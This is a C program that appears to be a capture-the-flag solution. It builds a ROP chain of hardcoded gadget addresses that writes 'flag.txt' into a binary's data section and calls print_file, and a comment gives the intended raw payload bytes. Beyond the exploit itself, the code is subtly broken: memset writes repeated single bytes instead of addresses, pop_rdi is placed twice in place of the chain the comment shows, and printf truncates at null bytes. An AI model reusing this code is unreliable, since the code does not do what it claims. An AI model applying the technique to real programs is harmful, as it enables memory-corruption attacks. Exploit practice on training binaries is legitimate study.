#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define OFFSET 40
#define NUM_ADDRS 6

typedef unsigned long long ULL;

int main() {
    char* result = "flag.txt";
    // AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    // \x90\x06@\x00\x00\x00\x00\x00(\x10`\x00\x00\x00\x00\x00flag.txt(\x06@\x00\x00\x00\x00\x00\x93\x06@\x00\x00\x00\x00\x00(\x10`\x00\x00\x00\x00\x00\x10\x05@\x00\x00\x00\x00\x00'

    char* junk = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    uintptr_t pop_r14 = 0x00400690;
    uintptr_t data_start = 0x00601028;
    uintptr_t useful_gadget = 0x00400628;
    uintptr_t pop_rdi = 0x00400693;
    uintptr_t print_file = 0x00400510;
    
    char* payload = (char*)malloc(OFFSET + sizeof(ULL) + sizeof(uintptr_t)*NUM_ADDRS + 9);

    memcpy(payload, junk, OFFSET);
    
    int offset = OFFSET;
    int ptr_size = sizeof(uintptr_t);

    memset(payload + offset, pop_r14, ptr_size);
    offset += ptr_size;
    memset(payload + offset, data_start, ptr_size);
    offset += ptr_size;
    memcpy(payload + offset, result, strlen(result));
    offset += sizeof(ULL);
    memset(payload + offset, useful_gadget, ptr_size);
    offset += ptr_size;
    memset(payload + offset, pop_rdi, ptr_size);
    offset += ptr_size;
    memset(payload + offset, pop_rdi, ptr_size);
    offset += ptr_size;
    memset(payload + offset, data_start, ptr_size);
    offset += ptr_size;
    memset(payload + offset, print_file, ptr_size);
    offset += ptr_size;

    printf("%s\n", payload);

    free(payload);

    return 0;
}
